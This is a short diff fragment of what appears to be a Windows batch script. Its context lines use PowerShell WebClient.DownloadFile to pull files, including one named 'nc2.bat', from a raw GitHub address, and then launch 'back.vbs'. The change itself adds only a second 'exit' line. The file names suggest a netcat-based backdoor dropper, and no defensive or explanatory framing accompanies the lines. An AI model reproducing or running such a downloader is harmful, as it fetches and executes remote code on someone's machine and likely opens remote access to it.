@@ -6,3 +6,4 @@ powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubuse
 powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/nc2.bat','nc2.bat')
 back.vbs
 exit
+exit
